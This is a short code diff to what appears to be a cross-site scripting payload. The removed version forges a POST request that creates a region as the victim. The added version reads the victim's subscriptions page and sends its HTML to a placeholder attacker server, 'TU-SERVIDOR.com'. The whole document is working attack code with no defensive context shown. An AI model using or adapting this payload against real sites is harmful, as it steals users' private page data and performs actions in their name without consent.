@@ -1,5 +1,5 @@
-fetch('/subscriptions/region/create/', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'regionName=HACKED&description=XSS&mapCenter=on&north=90&south=-90&east=180&west=-180'
-}).then(r => alert('Action performed as victim!'));
+fetch('/subscriptions/')
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://TU-SERVIDOR.com/log?data=' + encodeURIComponent(html));
+  });
